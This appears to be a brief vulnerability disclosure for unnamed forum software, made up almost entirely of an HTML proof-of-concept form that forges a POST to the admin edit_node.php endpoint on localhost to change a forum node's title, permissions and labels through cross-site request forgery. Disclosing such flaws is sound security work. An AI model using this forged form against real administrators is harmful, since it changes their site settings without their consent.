# Edit Node CSRF
Allows for the forum nodes to be edited through CSRF.

## PoC:
```html
<link rel="stylesheet" href="http://localhost/public/admin/bower_components/bootstrap/dist/css/bootstrap.min.css">

<form action="http://localhost/admin/edit_node.php/id/1" method="POST" style="padding: 25px;">
    <label for="cat_title">Title</label>
    <input type="text" name="node_title" id="cat_title" value="First Node" class="form-control">
    <label for="cat_desc">Description</label>
    <textarea name="node_desc" id="cat_desc" class="form-control">The first node on this forum</textarea>
    <label for="parent">Parent</label><br>
    <select name="node_parent" id="parent" style="width:100%;">
    <option value="1" selected="">First Category</option>
    </select>
    <br>
    <label for="additional_option">Additional Options</label><br>
    <input type="checkbox" name="lock_node" value="1" id="lock_node"> <label style="font-weight: normal;" for="lock_node">Lock Node</label>
    <br>
    <label for="allowed_usergroups">Allowed Usergroups</label><br>
    <input type="checkbox" name="allowed_ug[]" value="0" checked=""> Guest<br><input type="checkbox" name="allowed_ug[]" value="1" checked=""> User<br><input type="checkbox" name="allowed_ug[]" value="2"> Banned<br><input type="checkbox" name="allowed_ug[]" value="3" checked=""> Moderator<br><input type="checkbox" name="allowed_ug[]" value="4" checked=""> Administrator<br>
    <label for="labels">Labels</label> <small>Each Line is a new label. HTML enabled.</small>
    <textarea name="labels" id="labels" class="form-control"></textarea><br>
    <input type="submit" name="update" value="Save Changes" class="btn btn-default">
</form>
```
